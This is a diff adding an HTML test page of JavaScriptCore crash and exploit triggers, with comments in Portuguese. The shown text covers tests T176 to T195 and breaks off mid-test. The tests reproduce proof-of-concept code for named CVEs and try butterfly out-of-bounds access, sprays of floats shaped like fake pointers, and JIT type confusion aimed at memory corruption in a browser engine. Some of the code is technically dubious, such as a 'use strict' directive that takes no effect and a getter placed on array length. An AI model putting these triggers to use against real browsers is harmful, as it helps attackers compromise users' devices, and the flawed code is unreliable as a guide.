@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Testes08 — Butterfly / OSR Hint / Spread Overflow</title></head>
+<body>
+
+<p>Vetores novos: butterfly corruption, OSR hint stale (PoC exato zeroxjf),
+compileNewArrayWithSpread OOB, speculationFromValue assertion,
+DFG clobberize, ValueProfile assertion, NaN-boxing direto.</p>
+
+<button onclick="runAll()">RODAR TODOS</button>
+<br><br>
+<button onclick="t176()">Teste 176</button>
+<button onclick="t177()">Teste 177</button>
+<button onclick="t178()">Teste 178</button>
+<button onclick="t179()">Teste 179</button>
+<button onclick="t180()">Teste 180</button>
+<button onclick="t181()">Teste 181</button>
+<button onclick="t182()">Teste 182</button>
+<button onclick="t183()">Teste 183</button>
+<button onclick="t184()">Teste 184</button>
+<button onclick="t185()">Teste 185</button>
+<button onclick="t186()">Teste 186</button>
+<button onclick="t187()">Teste 187</button>
+<button onclick="t188()">Teste 188</button>
+<button onclick="t189()">Teste 189</button>
+<button onclick="t190()">Teste 190</button>
+<button onclick="t191()">Teste 191</button>
+<button onclick="t192()">Teste 192</button>
+<button onclick="t193()">Teste 193</button>
+<button onclick="t194()">Teste 194</button>
+<button onclick="t195()">Teste 195</button>
+<button onclick="t196()">Teste 196</button>
+<button onclick="t197()">Teste 197</button>
+<button onclick="t198()">Teste 198</button>
+<button onclick="t199()">Teste 199</button>
+<button onclick="t200()">Teste 200</button>
+
+<pre id="o"></pre>
+
+<script>
+function log(m){ document.getElementById('o').textContent += m + '\n'; }
+
+function runAll(){
+  log('=== RODAR TODOS: inicio ===');
+  t176(); t177(); t178(); t179(); t180();
+  t181(); t182(); t183(); t184(); t185();
+  t186(); t187(); t188(); t189(); t190();
+  t191(); t192(); t193(); t194(); t195();
+  t196(); t197(); t198(); t199(); t200();
+  log('=== RODAR TODOS: fim ===');
+}
+
+// T176 — CVE-2025-43529 OSR hint exato (zeroxjf ftl-hint.html)
+// "use strict" e obrigatorio — o bug so ocorre em strict mode
+// Phi merge com PutByOffset promoted stores; escape via sink = pack;
+// OSR exit no i=240 usa hints stale gerados antes do escape
+function t176(){
+  log('Teste 176: inicio');
+  try {
+    'use strict';
+    let sink = null;
+    function makeA(v){ const o={}; o.x=v; o.y=v+1; const a=[v,v+2]; return {o,a}; }
+    function makeB(v){ const o={}; o.x=v; o.y=v+3; const a=[v,v+4]; return {o,a}; }
+    function trigger(osrFlip){
+      let acc=0;
+      for(let i=0;i<300;i++){
+        const pack=(i&1)?makeA(0x11110000+i):makeB(0x22220000+i);
+        sink=pack;
+        acc+=i;
+        if(osrFlip&&i===240){ acc={v:acc}; }
+      }
+      return {x:sink.o.x, y:sink.o.y, a0:sink.a[0], a1:sink.a[1]};
+    }
+    for(let i=0;i<100000;i++) trigger(false);
+    try {
+      const result=trigger(true);
+      // Detectar corrupcao: valores devem ser 0x22220000+299 range
+      const expected=0x22220000+299;
+      if(result.x>0xFFFFFFFF||result.y>0xFFFFFFFF){
+        let arr=new Float64Array(1);
+        arr[result.x>>>0]=1.5; // OOB com valor corrompido
+      }
+    } catch(e){}
+  } catch(e){}
+  log('Teste 176: fim');
+}
+
+// T177 — CVE-2025-43529 variante osr-hint (Phi block)
+// Phi de tres ramos com estruturas distintas — mais pressao no sinking phase
+function t177(){
+  log('Teste 177: inicio');
+  try {
+    'use strict';
+    let sinkA=null, sinkB=null;
+    function mkX(v){ const o={}; o.x=v; o.z=v+10; return o; }
+    function mkY(v){ const o={}; o.y=v; o.w=v+20; return o; }
+    function mkZ(v){ const o={}; o.x=v; o.y=v; o.z=v; o.w=v; return o; }
+    function triggerPhi(flip){
+      let s=0;
+      for(let i=0;i<500;i++){
+        let obj;
+        if(i%3===0)      obj=mkX(i);
+        else if(i%3===1) obj=mkY(i);
+        else             obj=mkZ(i);
+        sinkA=obj;
+        s+=i;
+        if(flip&&i===350){ s={val:s}; } // OSR flip no meio
+      }
+      sinkB=sinkA;
+      return s;
+    }
+    for(let i=0;i<80000;i++) triggerPhi(false);
+    for(let i=0;i<50;i++){
+      try {
+        triggerPhi(true);
+        if(sinkB){
+          let vx=sinkB.x; let vy=sinkB.y;
+          let vz=sinkB.z; let vw=sinkB.w;
+        }
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 177: fim');
+}
+
+// T178 — CVE-2019-8601 compileNewArrayWithSpread: threshold exato de tier-up
+// DFG compila [...array] com array.length = 0x20001 (acima do tier-up de 200 iters)
+// A soma dos lengths overflowa Int32 no codigo JIT gerado
+function t178(){
+  log('Teste 178: inicio');
+  try {
+    function jitMe(array){ return [...array]; }
+    // Tier-up minimo: 300 iteracoes com array pequeno
+    const dummy=[1.1,2.2,3.3];
+    for(let i=0;i<400;i++) jitMe(dummy);
+    // Agora tamanho que causa overflow no calculo interno do DFG
+    function trySize(sz){
+      try {
+        const a=new Array(sz).fill(1.1);
+        jitMe(a);
+      } catch(e){}
+    }
+    trySize(0x20001);      // exatamente acima do threshold documentado
+    trySize(0x3FFFF);
+    trySize(0x7FFFF);
+    trySize(0xFFFFF);
+    // Dois arrays cujo total faz overflow
+    function jitTwo(a,b){ return [...a,...b]; }
+    for(let i=0;i<400;i++) jitTwo([1.1],[2.2]);
+    try {
+      const big=new Array(0x800000).fill(1.1);
+      jitTwo(big,big); // 0x1000000 — overflow possivel
+    } catch(e){}
+  } catch(e){}
+  log('Teste 178: fim');
+}
+
+// T179 — speculationFromValue assertion failure (slowmistio Issue-198327)
+// ValueProfile armazena JSValue; apos GC o slot fica com valor invalido;
+// speculationFromValue(valor_invalido) dispara ASSERT em builds debug,
+// em release pode causar comportamento indefinido
+function t179(){
+  log('Teste 179: inicio');
+  try {
+    // Criar muitos objetos e passa-los por um ponto de profile
+    function profPoint(v){ return v; }
+    const refs=[];
+    for(let i=0;i<2000;i++){
+      const obj={ id:i, data:new Float64Array(8) };
+      profPoint(obj);
+      refs.push(obj);
+    }
+    // Soltar referencias — GC pode coletar, ValueProfile fica com ponteiro morto
+    refs.length=0;
+    let trash=new Array(200000).fill(null).map(function(){ return {x:new Uint8Array(4)}; });
+    trash=null;
+    // Funcao JIT que usa o ValueProfile agora corrompido
+    function useProf(n){
+      let v=profPoint(n);
+      if(typeof v==='object'&&v!==null) return v.id+v.data[0];
+      return n*2;
+    }
+    for(let i=0;i<0x20000;i++) useProf(i%2===0?{id:i,data:new Float64Array(8)}:i);
+    // Pos-JIT: prediction baseada em ValueProfile stale pode ser errada
+    for(let i=0;i<1000;i++){
+      try { useProf(null); }         catch(e){}
+      try { useProf(undefined); }    catch(e){}
+      try { useProf(Symbol('s')); }  catch(e){}
+      try { useProf(BigInt(42)); }   catch(e){}
+      try { useProf({id:i,data:null}); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 179: fim');
+}
+
+// T180 — JSPropertyNameEnumerator OwnKeys proxy crash (slowmistio exact PoC)
+// ownKeys retorna o proprio alvo (array) como lista de chaves;
+// JSPropertyNameEnumerator usa StructureID do alvo como se fosse lista de strings — SEGV
+function t180(){
+  log('Teste 180: inicio');
+  try {
+    var o={a:0};
+    function opt(){
+      let p=new Proxy({},{ownKeys:function(a){ return a; }});
+      o.__proto__=p;
+      try { for(let x in o){} } catch(e){}
+      o.__proto__=Object.prototype; // restaurar para prox iteracao
+    }
+    // 350 iteracoes e o threshold documentado no PoC original
+    for(let t=0;t<400;t++) opt();
+  } catch(e){}
+  log('Teste 180: fim');
+}
+
+// T181 — Butterfly header corruption via COW array unsharing
+// JSC usa Copy-on-Write para arrays literais; ao modificar um COW array,
+// JSC "unshares" alocando novo butterfly; se a alocacao falhar de forma
+// inesperada ou se o tamanho calculado for errado, o header fica corrompido
+function t181(){
+  log('Teste 181: inicio');
+  try {
+    // Criar muitos arrays COW identicos (JSC pode compartilhar o butterfly)
+    const template=[1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8];
+    const cows=[];
+    for(let i=0;i<1000;i++) cows.push([1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8]);
+    // Funcao JIT que le do COW array
+    function readCOW(arr){ return arr[0]+arr[1]+arr[2]; }
+    for(let i=0;i<0x30000;i++) readCOW(cows[i%1000]);
+    // Unshare: modificar metade dos COW arrays — butterfly novo para cada
+    for(let i=0;i<500;i++){ cows[i][0]=i*0.1; } // unshare
+    // Agora JIT pode estar usando IC do COW original em arrays unshared
+    for(let i=0;i<1000;i++){
+      try { readCOW(cows[i%1000]); } catch(e){}
+    }
+    // Forcar GC — se butterfly antigo (COW) foi liberado e JIT ainda aponta para ele
+    let trash=new Array(100000).fill(null).map(function(){ return [1.1,2.2,3.3]; });
+    trash=null;
+    for(let i=0;i<500;i++){
+      try { readCOW(cows[i%1000]); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 181: fim');
+}
+
+// T182 — DFG: GetByVal em ArrayWithDouble com indice que veio de operacao bitwise
+// Operacoes bitwise retornam Int32; se o resultado e negativo, GetByVal Int32 negativo
+// em ArrayWithDouble pode bypassar bounds check em versoes antigas do JIT
+function t182(){
+  log('Teste 182: inicio');
+  try {
+    const arr=new Array(64).fill(0).map(function(_,i){ return i*1.1; });
+    // Forcar ArrayWithDouble (nao ArrayWithContiguous)
+    arr[0]=1.5; arr[1]=2.5;
+    function readIdx(a,x){ return a[x]; }
+    // Warmup: indices positivos — JIT especializa para ArrayWithDouble + Int32 index
+    for(let i=0;i<0x40000;i++) readIdx(arr,i%64);
+    // Pos-FTL: indices negativos via operacoes bitwise
+    const neg=[
+      -1, -2, ~0, ~1,        // bitwise NOT resulta em negativo
+      0xFFFFFFFF|0,           // -1 como Int32
+      (0x80000000|0),         // Int32 min
+      (1<<31),                // Int32 min via shift
+      -(1>>>0),               // gigante negativo
+    ];
+    for(let idx of neg){
+      try { readIdx(arr,idx); }      catch(e){}
+      try { arr[idx]=9.9; }          catch(e){}
+      try { arr[idx|0]=8.8; }        catch(e){}
+    }
+    // Indice calculado por bitwise entre dois valores JIT-compilados
+    function bitwiseIdx(a,b){ return arr[(a^b)&0xFF]; }
+    for(let i=0;i<0x40000;i++) bitwiseIdx(i,i+1);
+    try { bitwiseIdx(0xFFFFFFFF,0); }    catch(e){}
+    try { bitwiseIdx(0x80000000,0x7FFFFFFF); } catch(e){}
+  } catch(e){}
+  log('Teste 182: fim');
+}
+
+// T183 — DFG clobberize: nodo que deveria clobberTop mas nao o faz
+// clobberize descreve quais acessos de heap cada DFG node pode fazer;
+// se um node nao declara um clobber que de fato faz, CSE pode cachear um valor
+// que foi modificado por esse node
+function t183(){
+  log('Teste 183: inicio');
+  try {
+    // Simular o padrao: leitura, operacao potencialmente clobbering, releitura
+    let targetObj={ val:1.5, counter:0 };
+    function clobberOp(){
+      // operacao que pode modificar targetObj.val internamente
+      targetObj.counter++;
+      if(targetObj.counter%100===0) targetObj.val*=2;
+      return targetObj.counter;
+    }
+    function victim(o){
+      let a=o.val;       // leitura 1 — CSE cacheia
+      clobberOp();       // pode modificar o.val (se clobberize nao declarar, CSE ignora)
+      let b=o.val;       // leitura 2 — CSE pode reusar 'a'
+      return a*b;        // se CSE correto: a*a; se bugado e b>a: a*(a*2)
+    }
+    for(let i=0;i<0x40000;i++) victim(targetObj);
+    // Forcar divergencia mais agressiva
+    for(let i=0;i<500;i++){
+      try {
+        targetObj.counter=99; // proxima chamada de clobberOp vai modificar val
+        let r=victim(targetObj);
+        // Usar r como indice
+        let arr=new Float64Array(32);
+        arr[Math.abs(r)|0 % 32]=r;
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 183: fim');
+}
+
+// T184 — JSC butterfly: acesso OOB via length > capacidade do butterfly
+// O butterfly tem: header com publicLength e vectorLength;
+// se publicLength > vectorLength, acesso por indice [publicLength-1] e OOB no butterfly
+function t184(){
+  log('Teste 184: inicio');
+  try {
+    // Criar array e manipular length via getter para enganar JSC
+    const arr=[1.1,2.2,3.3,4.4,5.5];
+    let fakeLenCalled=0;
+    // Funcao JIT que usa arr.length para iterar
+    function iterArr(a){
+      let s=0;
+      for(let i=0;i<a.length;i++) s+=a[i];
+      return s;
+    }
+    for(let i=0;i<0x30000;i++) iterArr(arr);
+    // Agora redefinir length com getter que retorna valor maior que a capacidade real
+    const arr2=[1.1,2.2,3.3];
+    Object.defineProperty(arr2,'length',{
+      get:function(){ fakeLenCalled++; return fakeLenCalled>0x30000?100:3; },
+      set:function(){},
+      configurable:true
+    });
+    for(let i=0;i<0x30000;i++) iterArr(arr2); // JIT ve length=3
+    // Agora length retorna 100 mas vectorLength e 3 — OOB no butterfly
+    for(let i=0;i<100;i++){
+      try { iterArr(arr2); } catch(e){}
+    }
+    // Versao com TypedArray: length fixo mas tentar via subarray
+    const base=new Float64Array(8);
+    for(let i=0;i<8;i++) base[i]=i*1.1;
+    // subarray com begin e end invertidos — comportamento especificado mas pode ter bugs
+    try { base.subarray(7,2); }        catch(e){}
+    try { base.subarray(-1,-8); }      catch(e){}
+    try { base.subarray(0x7FFFFFFF,0); } catch(e){}
+  } catch(e){}
+  log('Teste 184: fim');
+}
+
+// T185 — DFG: NaN-boxing direto — injetar float64 que parece ponteiro JSC em heap
+// JSC usa NaN-boxing: float64 com todos os bits de expoente setados e fracao!=0 e NaN;
+// valores com tag 0xFFFF______ sao ponteiros; injetar esses valores via Float64Array
+// e tentar usa-los como JSValue pode corromper o GC
+function t185(){
+  log('Teste 185: inicio');
+  try {
+    // Construir valores float64 cujos bits se parecem com ponteiros JSC validos
+    const buf=new ArrayBuffer(8);
+    const f64=new Float64Array(buf);
+    const u32=new Uint32Array(buf);
+
+    function makeJSValueFloat(hi,lo){
+      u32[1]=hi; u32[0]=lo;
+      return f64[0];
+    }
+    // JSValue tags para JSVALUE64: 0xFFFF = cell pointer
+    const poisonFloats=[
+      makeJSValueFloat(0xFFFF0000,0x00000010), // ponteiro alinhado em 16
+      makeJSValueFloat(0xFFFF0000,0x00010000),
+      makeJSValueFloat(0xFFFF0001,0x00000000),
+      makeJSValueFloat(0xFFFF0010,0x00000000),
+      makeJSValueFloat(0x00000000,0x00000001), // Int32 tag
+      makeJSValueFloat(0xFFFE0000,0x00000000), // double tag
+    ];
+    // Spray: colocar em Float64Array e tentar le-los como JSValues via conversao
+    const fa=new Float64Array(64);
+    for(let v of poisonFloats) fa.fill(v);
+    // Funcao JIT que usa o array e tenta conversoes de tipo
+    function useFA(a,i){
+      let v=a[i];
+      // Tentar usar v como se fosse um ponteiro JSC
+      let asInt=v|0;
+      let asUint=v>>>0;
+      return asInt+asUint;
+    }
+    for(let i=0;i<0x30000;i++) useFA(fa,i%64);
+    // Pos-FTL: injetar os poison floats individualmente
+    for(let pf of poisonFloats){
+      fa.fill(pf);
+      for(let i=0;i<100;i++){
+        try { useFA(fa,i%64); } catch(e){}
+      }
+    }
+  } catch(e){}
+  log('Teste 185: fim');
+}
+
+// T186 — DFG: Object.create com proto que e TypedArray — tipo de objeto inesperado
+// Object.create(proto) onde proto e TypedArray ou outro objeto exotico cria objeto
+// cujo [[Prototype]] e exotico; IC que assume proto normal pode falhar
+function t186(){
+  log('Teste 186: inicio');
+  try {
+    const taProto=new Float64Array(8);
+    const mapProto=new Map([[1,2],[3,4]]);
+    const setProto=new Set([1,2,3]);
+    const arrProto=[1.1,2.2,3.3];
+    const fnProto=function(){};
+    const protos=[taProto,mapProto,setProto,arrProto,fnProto,null,Object.prototype];
+    // Funcao JIT que acessa .x em objetos criados com Object.create
+    function readX(o){ return o.x; }
+    // Warmup com objeto normal
+    const normal={x:1.5};
+    for(let i=0;i<0x20000;i++) readX(normal);
+    // Criar objetos com protos exoticos
+    for(let proto of protos){
+      try {
+        const obj=Object.create(proto);
+        obj.x=42.0;
+        for(let i=0;i<1000;i++){
+          try { readX(obj); } catch(e){}
+        }
+      } catch(e){}
+    }
+    // Mudar proto de objeto JIT-compilado para TypedArray
+    const victim={x:1.0,y:2.0};
+    for(let i=0;i<0x20000;i++) readX(victim);
+    Object.setPrototypeOf(victim,taProto);
+    for(let i=0;i<500;i++){
+      try { readX(victim); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 186: fim');
+}
+
+// T187 — DFG: String.prototype.replace com funcao de substituicao que modifica a string
+// replace com funcao: a funcao e chamada com os grupos do match;
+// se a funcao modifica a string-alvo (via closure), o indice pode ficar invalido
+function t187(){
+  log('Teste 187: inicio');
+  try {
+    // Funcao JIT que chama replace com funcao simples (sem side-effects)
+    function doReplace(s){ return s.replace(/\w+/g,function(m){ return m.toUpperCase(); }); }
+    for(let i=0;i<0x20000;i++) doReplace('hello world foo bar');
+    // Agora: funcao de substituicao com side-effect que modifica o iteravel
+    let targetStr='hello world foo bar baz';
+    let replaceCalls=0;
+    function sideEffectReplace(match,offset,str){
+      replaceCalls++;
+      if(replaceCalls===3){
+        // Modificar targetStr durante o replace (nao e o parametro str — e a variavel externa)
+        targetStr='MODIFIED DURING REPLACE';
+      }
+      return match.toUpperCase();
+    }
+    try { targetStr.replace(/\w+/g,sideEffectReplace); } catch(e){}
+    // replace com regex que tem backreference e funcao que lanca
+    let throwAt=5;
+    function throwingReplace(match,p1,offset){
+      throwAt--;
+      if(throwAt===0) throw new RangeError('replace_fn_throws');
+      return p1?p1.toUpperCase():match;
+    }
+    try { 'one two three four five six'.replace(/(\w+)/g,throwingReplace); } catch(e){}
+    // String.prototype.replaceAll com funcao
+    function doReplaceAll(s,fn){ return s.replaceAll('o',fn); }
+    for(let i=0;i<0x20000;i++) doReplaceAll('hello world foo boo moo',function(m){ return 'O'; });
+    let racCount=0;
+    try {
+      doReplaceAll('hello world',function(m,offset,str){
+        racCount++;
+        if(racCount===2) throw new TypeError('replaceAll_fn_throws');
+        return m.toUpperCase();
+      });
+    } catch(e){}
+  } catch(e){}
+  log('Teste 187: fim');
+}
+
+// T188 — DFG: Array.prototype.indexOf / lastIndexOf com getter no indice buscado
+// indexOf usa SameValueZero para comparacao; se o valor buscado tem valueOf que
+// lanca ou retorna tipo diferente a cada chamada, comportamento e indefinido no JIT
+function t188(){
+  log('Teste 188: inicio');
+  try {
+    const arr=new Array(1000).fill(0).map(function(_,i){ return i*1.1; });
+    arr[500]=42.0; // valor que indexOf deveria encontrar
+    function findIn(a,v){ return a.indexOf(v); }
+    function findLast(a,v){ return a.lastIndexOf(v); }
+    // Warmup
+    for(let i=0;i<0x20000;i++){
+      findIn(arr,i%100*1.1);
+      findLast(arr,i%100*1.1);
+    }
+    // Valor a buscar com valueOf que retorna diferente a cada chamada
+    let vCount=0;
+    const evilVal={
+      valueOf:function(){ vCount++; return vCount%2===0?42.0:99.9; },
+      [Symbol.toPrimitive]:function(h){ return vCount%3===0?42.0:-1.0; }
+    };
+    for(let i=0;i<500;i++){
+      try { findIn(arr,evilVal); }   catch(e){}
+      try { findLast(arr,evilVal); } catch(e){}
+    }
+    // Getter em elemento do array que lanca durante a comparacao
+    Object.defineProperty(arr,'499',{
+      get:function(){ throw new RangeError('arr_499_throws'); },
+      configurable:true, enumerable:true
+    });
+    for(let i=0;i<200;i++){
+      try { findIn(arr,42.0); }   catch(e){}
+      try { findLast(arr,42.0); } catch(e){}
+    }
+    // includes com NaN (SameValueZero: NaN===NaN e true em includes mas false em indexOf)
+    const arrWithNaN=[1.1,NaN,3.3,NaN,5.5];
+    function doIncludes(a,v){ return a.includes(v); }
+    for(let i=0;i<0x20000;i++) doIncludes(arrWithNaN,i%2===0?NaN:1.1);
+    for(let i=0;i<500;i++){
+      try { doIncludes(arrWithNaN,evilVal); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 188: fim');
+}
+
+// T189 — DFG: Function.prototype.bind chain longa + JIT inline
+// bind cria uma nova funcao; JIT pode inline funcoes bound;
+// chain longa de binds pode causar stack overflow no inline recursivo
+function t189(){
+  log('Teste 189: inicio');
+  try {
+    function base(a,b,c){ return a+b+c; }
+    // Criar chain de 50 binds
+    let fn=base;
+    for(let i=0;i<50;i++) fn=fn.bind(null,i*0.1);
+    // Warmup: JIT compila chamada a fn (bound chain)
+    for(let i=0;i<0x20000;i++) fn();
+    // Chain ainda mais longa
+    let fn2=base;
+    for(let i=0;i<200;i++) fn2=fn2.bind(null,i*0.01);
+    for(let i=0;i<1000;i++){
+      try { fn2(); } catch(e){}
+    }
+    // bind com argumentos de tipo misto
+    const mixed=base.bind(null,1.5,'str',Symbol('x'));
+    for(let i=0;i<1000;i++){
+      try { mixed(); } catch(e){}
+    }
+    // bind de funcao nativa (Array.prototype.push)
+    const push=Array.prototype.push.bind([]);
+    for(let i=0;i<0x20000;i++) push(i*0.1);
+    // bind de funcao JIT-compilada com this inesperado
+    const noThis=base.bind(42); // this=42 (numero primitivo)
+    for(let i=0;i<0x20000;i++) noThis(1,2,3);
+    const objThis=base.bind({valueOf:function(){ return 99; }}); // this=objeto com valueOf
+    for(let i=0;i<1000;i++){
+      try { objThis(1,2,3); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 189: fim');
+}
+
+// T190 — DFG: Spread em chamada de funcao com iteravel que modifica seus elementos
+// fn(...iter) onde iter e um Proxy que retorna elementos diferentes a cada acesso;
+// DFG pode nao re-ler os elementos apos coleta-los, usando valores stale
+function t190(){
+  log('Teste 190: inicio');
+  try {
+    function target(a,b,c,d,e){ return a+b+c+d+e; }
+    // Warmup com array normal
+    for(let i=0;i<0x20000;i++) target(...[1.1,2.2,3.3,4.4,5.5]);
+    // Iteravel Proxy que retorna valores diferentes entre coleta e uso
+    let iterStep=0;
+    const evilIter={
+      [Symbol.iterator]:function(){
+        iterStep=0;
+        return {
+          next:function(){
+            iterStep++;
+            if(iterStep>5) return {done:true};
+            // Retornar tipo diferente apos certa iteracao
+            if(iterStep===3) return {value:Symbol('mid'),done:false};
+            return {value:iterStep*1.1,done:false};
+          }
+        };
+      }
+    };
+    for(let i=0;i<500;i++){
+      try { target(...evilIter); } catch(e){}
+    }
+    // Spread de iteravel que lanca no meio
+    let throwStep=0;
+    const throwIter={
+      [Symbol.iterator]:function(){
+        throwStep=0;
+        return {
+          next:function(){
+            throwStep++;
+            if(throwStep===3) throw new TypeError('iter_throws_at_3');
+            if(throwStep>5) return {done:true};
+            return {value:throwStep,done:false};
+          }
+        };
+      }
+    };
+    for(let i=0;i<500;i++){
+      try { target(...throwIter); } catch(e){}
+    }
+    // Spread de TypedArray que e detachado durante a coleta
+    function spreadTA(ta){ return target(...ta); }
+    const taSpread=new Float64Array([1.1,2.2,3.3,4.4,5.5]);
+    for(let i=0;i<0x20000;i++) spreadTA(taSpread);
+    // Tentar detach durante spread via postMessage no meio do iterador
+    // (nao e possivel diretamente, mas a troca de tipo da TA causa o mesmo problema)
+    const taSparse=new Float64Array(5);
+    taSparse[0]=1.1; taSparse[4]=5.5; // sparse
+    try { spreadTA(taSparse); } catch(e){}
+  } catch(e){}
+  log('Teste 190: fim');
+}
+
+// T191 — DFG: Math.hypot / Math.max / Math.min com TypedArray via apply
+// apply com array-like passa elementos como argumentos;
+// TypedArray com muitos elementos via apply.call pode causar stack overflow ou OOB
+function t191(){
+  log('Teste 191: inicio');
+  try {
+    // Warmup: Math.max com poucos argumentos
+    for(let i=0;i<0x20000;i++) Math.max(i,i+1,i+2,i+3);
+    // apply com TypedArray de tamanho crescente
+    function tryMax(size){
+      try {
+        const ta=new Float64Array(size);
+        for(let i=0;i<size;i++) ta[i]=i*0.1;
+        return Math.max.apply(null,ta);
+      } catch(e){ return -1; }
+    }
+    tryMax(100);
+    tryMax(1000);
+    tryMax(10000);
+    tryMax(65535);    // threshold comum para ArgumentsCountExceedsMax
+    tryMax(65536);    // um a mais
+    tryMax(100000);
+    // Math.hypot com valores especiais
+    const specials=[NaN,Infinity,-Infinity,-0,0,Number.MAX_VALUE,Number.MIN_VALUE];
+    for(let i=0;i<500;i++){
+      try { Math.hypot.apply(null,specials); } catch(e){}
+    }
+    // Math.min com array que tem getter em elementos
+    const arrWithGetter=[1.0,2.0,3.0];
+    Object.defineProperty(arrWithGetter,'1',{
+      get:function(){ return -Infinity; }, // minimo sera -Infinity
+      configurable:true
+    });
+    for(let i=0;i<500;i++){
+      try { Math.min.apply(null,arrWithGetter); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 191: fim');
+}
+
+// T192 — JSC: Proxy em cadeia de prototype com for-in (OwnKeys recursivo)
+// for-in percorre a cadeia de prototypes chamando ownKeys em cada nivel;
+// Proxy que retorna outro Proxy como elemento de ownKeys cria recursao inesperada
+function t192(){
+  log('Teste 192: inicio');
+  try {
+    // Proxy cujo ownKeys retorna chaves que incluem outro Proxy
+    let depth=0;
+    function makeProxyChain(n){
+      if(n<=0) return {};
+      const inner=makeProxyChain(n-1);
+      return new Proxy({a:n},{
+        ownKeys:function(t){
+          depth++;
+          if(depth>20) return ['a']; // limite de seguranca
+          return ['a',inner];        // retornar objeto como "chave"
+        },
+        getOwnPropertyDescriptor:function(t,k){
+          return {value:k,writable:true,enumerable:true,configurable:true};
+        }
+      });
+    }
+    const chain=makeProxyChain(10);
+    depth=0;
+    try { for(let k in chain){} } catch(e){}
+    // Proxy de Proxy com ownKeys que se referencia
+    const selfRef=new Proxy({},{
+      ownKeys:function(t){ return [selfRef]; }, // retornar o proprio proxy como chave
+      getOwnPropertyDescriptor:function(t,k){
+        return {value:1,writable:true,enumerable:true,configurable:true};
+      }
+    });
+    for(let i=0;i<400;i++){
+      try { for(let k in selfRef){} } catch(e){}
+    }
+    // OwnKeys retornando array misturado com nao-strings
+    const mixedKeys=new Proxy({},{
+      ownKeys:function(t){ return ['a',42,Symbol('s'),null,undefined,{}]; },
+      getOwnPropertyDescriptor:function(t,k){
+        return {value:1,writable:true,enumerable:true,configurable:true};
+      }
+    });
+    for(let i=0;i<400;i++){
+      try { for(let k in mixedKeys){} } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 192: fim');
+}
+
+// T193 — JSC: eval com codigo que usa with statement + getter que lanca
+// with statement desabilita muitas otimizacoes; eval dentro de with cria
+// scope chain complexo que o JIT precisa modelar
+function t193(){
+  log('Teste 193: inicio');
+  try {
+    let getterCalls=0;
+    const scope={
+      get x(){ getterCalls++; if(getterCalls%5===0) throw new RangeError('scope_x_throws'); return getterCalls*1.5; },
+      y:2.0, z:3.0
+    };
+    // with + eval
+    function withEval(obj,code){
+      with(obj){ // eslint-disable-line no-with
+        try { return eval(code); } catch(e){ return -1; }
+      }
+    }
+    // Warmup
+    for(let i=0;i<0x10000;i++) withEval(scope,'y+z');
+    // Usar x (getter que pode lancar)
+    for(let i=0;i<500;i++){
+      try { withEval(scope,'x+y'); }   catch(e){}
+      try { withEval(scope,'x*z'); }   catch(e){}
+      try { withEval(scope,'x+x'); }   catch(e){} // getter chamado duas vezes
+    }
+    // with com Proxy como scope
+    const proxyScope=new Proxy({},{
+      has:function(t,k){ return true; }, // qualquer chave "existe"
+      get:function(t,k,r){
+        if(k==='x') return 42.0;
+        if(k==='y') return 84.0;
+        if(k===Symbol.unscopables) return undefined;
+        return undefined;
+      }
+    });
+    for(let i=0;i<500;i++){
+      try { withEval(proxyScope,'x+y'); }         catch(e){}
+      try { withEval(proxyScope,'undeclared'); }   catch(e){}
+    }
+  } catch(e){}
+  log('Teste 193: fim');
+}
+
+// T194 — DFG: Array.prototype.flat com getter em profundidade e array ciclico
+// flat() usa a propriedade .length e acesso numerico em cada nivel;
+// getter em elementos pode retornar o proprio array (ciclo)
+function t194(){
+  log('Teste 194: inicio');
+  try {
+    // flat normal — JIT compila para array plano
+    function doFlat(a,d){ return a.flat(d); }
+    for(let i=0;i<0x20000;i++) doFlat([[1.1,[2.2,[3.3]]],4.4],3);
+    // flat com getter que retorna ciclo
+    const cycleArr=[1.1,2.2];
+    cycleArr[2]=cycleArr; // ciclo direto
+    try { doFlat(cycleArr,5); } catch(e){}
+    // flat com depth=Infinity em array muito profundo
+    let deepNest=1.1;
+    for(let i=0;i<500;i++) deepNest=[deepNest];
+    try { doFlat(deepNest,Infinity); } catch(e){}
+    // flat com getter no elemento que lanca
+    const arrWithThrow=[1.1,2.2,3.3];
+    Object.defineProperty(arrWithThrow,'1',{
+      get:function(){ throw new TypeError('flat_element_throws'); },
+      enumerable:true, configurable:true
+    });
+    try { doFlat(arrWithThrow,2); } catch(e){}
+    // flat com getter em length que muda durante a operacao
+    const dynLen=[1.1,2.2,3.3,[4.4,5.5]];
+    let lenVal=4;
+    Object.defineProperty(dynLen,'length',{
+      get:function(){ lenVal=lenVal===4?100:4; return lenVal; },
+      set:function(){},
+      configurable:true
+    });
+    try { doFlat(dynLen,1); } catch(e){}
+  } catch(e){}
+  log('Teste 194: fim');
+}
+
+// T195 — JSC: Promise chain com resolve/reject chamados de dentro de finalizer
+// WeakRef + FinalizationRegistry: o callback do registry pode chamar resolve/reject
+// em promises ativas; isso cria interacao entre GC e microtask queue
+function t195(){
+  log('Teste 195: inicio');
+  try {
+    let resolvers=[];
+    const registry=new FinalizationRegistry(function(val){
+      // Chamar resolve/reject de dentro do finalizador
+      if(resolvers.length>0){
+        const {resolve,reject}=resolvers.shift();
+        if(val%2===0) resolve(val);
+        else reject(new Error('finalized_'+val));
+      }
+    });
+    // Criar objetos registrados no registry
+    for(let i=0;i<50;i++){
+      let p=new Promise(function(res,rej){ resolvers.push({resolve:res,reject:rej}); });
+      p.catch(function(){});
+      let obj={id:i,data:new Uint32Array(4)};
+      registry.register(obj,'val_'+i);
+      obj=null; // deixar ser coletado
+    }
+    // GC pressure para triggerar o finalizador
+    for(let i=0;i<10;i++){
+      let trash=new Array(100000).fill(null).map(function(){ return {x:new Uint8Array(8)}; });
+      trash=null;
+    }
+    // WeakRef cujo valor pode ser coletado durante o uso
+    let weakTarget={important:new Float64Array([1.1,2.2,3.3])};
+    const wr=new WeakRef(weakTarget);
